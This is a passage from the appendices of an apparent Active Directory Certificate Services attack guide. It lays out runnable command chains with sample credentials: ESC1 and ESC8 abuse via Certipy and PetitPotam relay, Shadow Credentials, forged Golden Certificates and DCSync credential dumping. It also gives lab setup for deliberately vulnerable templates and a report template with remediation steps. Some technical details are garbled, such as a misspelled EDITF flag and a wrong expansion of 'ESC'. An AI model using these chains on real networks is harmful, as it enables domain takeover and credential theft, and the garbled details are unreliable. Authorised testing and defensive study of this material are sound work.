```cypher
// Find templates where Domain Users have Enroll
MATCH (u:Group {name:'DOMAIN USERS@CORP.LOCAL'}), (t)
WHERE (u)-[:Enroll]->(t)
RETURN t.name, t.esc1, t.esc2, t.esc6
```

```cypher
// Find users with GenericWrite on computers (Shadow Credentials candidates)
MATCH (u:User), (c:Computer)
WHERE (u)-[:GenericWrite]->(c)
RETURN u.name, c.name
```

---

## Appendix D -- Common Engagement Scenarios

### Scenario 1 -- Quick Win (Domain User -> DA via ESC1)

A common engagement scenario where the attacker has standard user credentials and finds an ESC1 template.

```bash
# Step 1: Enumerate as the standard user
certipy find -u 'corp\joe' -p 'JoePass123!' -dc-ip 10.10.0.1 -vulnerable

# Step 2: If ESC1 template found, request SAN=administrator
certipy req -u 'corp\joe' -p 'JoePass123!' -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'VulnTemplate' \
  -san 'administrator@corp.local'

# Step 3: PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1

# Step 4: DCSync
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### Scenario 2 -- Unauthenticated to DA via PetitPotam + ESC8

The classic 2021 unauthenticated-to-DA chain.

```bash
# Terminal 1: Relay listener
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController'

# Terminal 2: Trigger PetitPotam (anonymous)
python3 PetitPotam.py -u '' -p '' -d corp.local \
  10.10.0.100 10.10.0.1

# Terminal 3: Use the resulting PFX
echo '<base64_pfx>' | base64 -d > dc01.pfx
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.1
KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass dc01.corp.local
```

### Scenario 3 -- Shadow Credentials Persistence

After obtaining GenericWrite on a target via ACL abuse.

```bash
# Step 1: Use GenericWrite to add KeyCredentialLink
pywhisker.py -d corp.local -u 'svc_writer' -p 'WriterPass!' \
  --target 'Administrator' --action 'add'

# Step 2: PKINIT as the target
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1

# Step 3: Persistence -- the KeyCredentialLink survives password resets
```

### Scenario 4 -- Post-2022 Hardened Environment

In an environment with KB5005413 + KB5014754 applied, ESC1 / ESC6 may not work. Pivot to Certifried or Shadow Credentials.

```bash
# Step 1: Check strong mapping mode
reg query \\\\dc01\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kerberos\\Parameters /v StrongCertificateBindingEnforcement

# If 2 (Full Enforce), ESC1 / ESC6 / ESC9 / ESC10 will fail

# Step 2: Pivot to Certifried (CVE-2022-26923) if the May 2022 patch is missing
# (See Section 20)

# Step 3: Or pivot to Shadow Credentials if you have GenericWrite on a target
# (See Section 21)
```

### Scenario 5 -- Golden Certificate Persistence

After extracting the CA private key.

```bash
# Step 1: Recover CA private key (from certsrv.edb or PFX backup)
# (See Section 22)

# Step 2: Forge a cert for administrator
certipy forge -ca-pfx ca.pfx -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Step 3: PKINIT
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.0.1
```

### Scenario 6 -- Exchange ProxyShell to AD CS Chain

In 2021, the ProxyShell vulnerability chain (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) against Exchange Server was often chained with AD CS attacks to escalate from Exchange Admin to Domain Admin.

```bash
# After gaining shell on Exchange as SYSTEM:
# Use the Exchange machine account cert to PKINIT
certipy req -u 'CORP\\EXCHANGE$' -hashes :ntlmhash -dc-ip 10.10.0.1 \
  -ca 'CORP-CA01-CA' -template 'Machine'

# The Exchange machine account may have GenericWrite on other objects
# (typical Exchange deployment grants this for mailbox delegation)
pywhisker.py -d corp.local -u 'CORP\\EXCHANGE$' -hashes :ntlmhash \
  --target 'Administrator' --action 'add'

# PKINIT as Administrator
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.1
```

---

## Appendix E -- Troubleshooting

### Common Errors and Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| `[-] Got access denied trying to get domain info` | Bad credentials | Verify username/password, try `-hashes :ntlm` for hash auth |
| `[-] RPC request failed` | Firewall blocks RPC | Check ports 135, 49152-65535 between attacker and CA |
| `[-] The certificate template is not published on the CA` | Template exists but not published | Run `certipy ca -enable-template 'Template'` (needs ManageCA) |
| `[-] PKINIT failed: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Cert SAN mismatch with target UPN | Re-issue cert with correct SAN, use `-upn` or `-dns` |
| `[-] Could not connect to LDAP` | Network/DNS issue | Use `-dc-ip` and `-ns` flags explicitly |
| `[-] CA name not found` | CA discovery failure | Specify `-ca 'CORP-CA01-CA'` explicitly |
| `[-] Strong certificate mapping is enforced` | Post-KB5005413 with Full Enforce | Pivot to Certifried or Shadow Credentials |

### Certipy Debug Mode

```bash
# Enable debug output
certipy find -u 'corp\svc_ldap' -p 'Password123!' -dc-ip 10.10.0.1 -debug
```

### Network Requirements

| Protocol | Port | Use |
|----------|------|-----|
| Kerberos | 88 (TCP/UDP) | PKINIT, TGT |
| LDAP | 389 (TCP) | Template enumeration |
| LDAPS | 636 (TCP) | Secure LDAP |
| SMB | 445 (TCP) | Coercion, file access |
| RPC | 135 (TCP) | ICPR (ESC11) |
| RPC dynamic | 49152-65535 (TCP) | ICPR endpoints |
| HTTP | 80 (TCP) | Web Enrollment (ESC8) |
| HTTPS | 443 (TCP) | Web Enrollment / CEP / CES |

---

## Appendix F -- Lab Setup Quick Reference

### Step 1 -- Deploy Windows Server

Install Windows Server 2019 or 2022. Promote to Domain Controller of a new forest (e.g., `corp.local`).

### Step 2 -- Install AD CS Role

```powershell
# Install the AD CS role and management tools
Install-WindowsFeature -Name AD-Certificate-Services -IncludeManagementTools

# Configure the CA
Install-AdcsCertificationAuthority -CAType "EnterpriseRootCACertificationAuthority" `
  -CACommonName "CORP-CA01-CA" -KeyLength 4096 -HashAlgorithm SHA256 -CryptoProviderName "RSA#Microsoft Software Key Storage Provider"
```

### Step 3 -- Enable Web Enrollment (Vulnerable Config)

```powershell
# Install the Web Enrollment role
Install-WindowsFeature -Name ADCS-Web-Enrollment

# Configure Web Enrollment (deliberately without EPA -- vulnerable ESC8 config)
Install-AdcsWebEnrollment -CAConfig "CA01.corp.local\CORP-CA01-CA"
```

### Step 4 -- Create a Vulnerable Template (ESC1)

```powershell
# Copy the User template to a new ESC1-vulnerable template
$vuln = Get-CATemplate | Where-Object Name -eq "User"
$vuln | Add-CATemplate -Name "VulnTemplate"

# Set the ENROLLEE_SUPPLIES_SUBJECT flag
Set-ADObject -Identity "CN=VulnTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" `
  -Replace @{msPKI-Certificate-Name-Flag = 1}

# Publish the template on the CA
Add-CATemplate -Name "VulnTemplate"
Publish-CATemplate -Name "VulnTemplate"
```

### Step 5 -- Enable EDITF (ESC6) for Vulnerable Lab

```cmd
:: Set the EDITF_ATTRIBUTESUBJECTALTSSUBJECT2 flag
certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTSSUBJECT2
net stop certsvc && net start certsvc
```

### Step 6 -- Verify Vulnerability

```bash
# From Kali, run certipy find and confirm ESC1 / ESC6 / ESC8 are detected
certipy find -u 'corp\\joe' -p 'JoePass123!' -dc-ip <DC_IP> -vulnerable
```

### Step 7 -- Practice the ESC8 Chain

```bash
# Run the full PetitPotam -> relay -> cert -> PKINIT chain against the lab
# (See Section 10)
```

---

## Appendix G -- Glossary

| Term | Definition |
|------|------------|
| AD CS | Active Directory Certificate Services -- Microsoft's enterprise PKI implementation |
| AIA | Authority Information Access -- extension pointing to the issuer's cert |
| ASN.1 | Abstract Syntax Notation One -- the encoding scheme for X.509 |
| CA | Certificate Authority |
| CDP | CRL Distribution Point -- extension pointing to the CRL |
| CEP | Certificate Enrollment Policy -- web service exposing enrollment policy |
| CES | Certificate Enrollment Service -- web service for enrollment |
| CRL | Certificate Revocation List |
| CSR | Certificate Signing Request |
| DC | Domain Controller |
| DER | Distinguished Encoding Rules -- the binary form of ASN.1 |
| EFS | Encrypting File System |
| EKU | Extended Key Usage -- OID list restricting what the cert can be used for |
| ESC | Enterprise Security Certificate (the SpecterOps naming convention for AD CS misconfig patterns) |
| Forest | The top-level container in AD, comprising one or more domains |
| GenericAll | Full control ACE |
| GenericWrite | Write to most attributes ACE |
| Golden Certificate | A certificate forged from the CA's private key (analogous to Golden Ticket) |
| HSM | Hardware Security Module -- tamper-resistant key storage |
| ICPR | ICertPassage RPC -- the RPC interface for cert enrollment (ESC11 target) |
| KDC | Key Distribution Center -- issues Kerberos tickets |
| KRA | Key Recovery Agent |
| msDS-KeyCredentialLink | AD attribute storing key material for Shadow Credentials |
| NDES | Network Device Enrollment Service -- Microsoft's SCEP impl |
| NTAuthStore | AD object listing CAs authorized to issue client auth certs |
| OCSP | Online Certificate Status Protocol |
| PEM | Privacy-Enhanced Mail -- base64-encoded cert format |
| PKI | Public Key Infrastructure |
| PKINIT | Public Key Cryptography for Initial Authentication in Kerberos (RFC 4556) |
| PFX | Personal Information Exchange -- binary cert + key container |
| SAN | Subject Alternative Name -- cert extension listing alternative subject names |
| SCEP | Simple Certificate Enrollment Protocol |
| Schannel | Secure Channel -- Microsoft's TLS implementation; also used for cert-based auth |
| SPN | Service Principal Name |
| Standalone CA | CA not integrated with AD |
| SubCA | Subordinate CA |
| TGT | Ticket-Granting Ticket |
| UPN | User Principal Name |
| X.509 | The standard defining public key certificates |

---

## Appendix H -- Engagement Report Template

For each AD CS finding in the final report, include:

```markdown
### Finding [N]: [ESC Pattern Name]

**Risk Rating**: CRITICAL / HIGH / MEDIUM / LOW

**Description**:
[Template / CA Name] is misconfigured such that [principal] can enroll and obtain
a certificate that authenticates as [privileged target].

**Vulnerable Configuration**:
- Template Name: [Template Name]
- msPKI-Certificate-Name-Flag: [Flag value] -- [Flag meaning]
- pKIExtendedKeyUsage: [EKU OIDs] -- [EKU meanings]
- ACL: [Principal] has [ACE Type] on the template

**Reproduction Steps**:
1. Authenticate as [principal] with credentials [sanitized].
2. Run: `certipy req -ca '[CA Name]' -template '[Template]' -san '[target]'`
3. Run: `certipy auth -pfx [target].pfx -dc-ip [DC]`
4. Result: TGT for [target] obtained.

**Impact**:
[Description of what the attacker can do with the forged cert. Typically: domain admin, enterprise admin, persistence, etc.]

**Remediation**:
1. Remove ENROLLEE_SUPPLIES_SUBJECT from the template: `[certutil command]`
2. Restrict the template ACL to [approved groups only].
3. Apply KB5014754 to enforce strong certificate mapping.
4. Document the change in the CA configuration log.

**Reference**:
- SpecterOps, "Certified Pre-Owned", Section [ESC#].
- Microsoft, "[KB article]".
```

---

## Final Reference List

- SpecterOps, "Certified Pre-Owned", June 2021
- SpecterOps, "Certified Pre-Owned: Abusing Active Directory Certificate Services", Black Hat USA 2021
- Gilles Lionel, "PetitPotam", July 2021
- Yair Mizrahi / Amplify Security, "Certifried (CVE-2022-26923)", May 2022
- Elad Shamir, "Shadow Credentials: Abusing Key Trust Account Mapping for Takeover", September 2021
- Oliver Lyak, Certipy documentation (ly4k fork), 2022-2024
- Microsoft, "KB5005413: Machine Account protection", August 2021
- Microsoft, "KB5014754: KB5014754—Application compatibility and certificate-based authentication changes", May 2022
- Microsoft, "Certificate-Based Authentication Changes", November 2023 enforcement notice
- HarmJ0y, "Certify", GhostPack
- GentilKiwi, "Kekeo" and "mimikatz"
- "Abusing Active Directory Certificate Services -- Part 1 / 2", Compass Security Blog
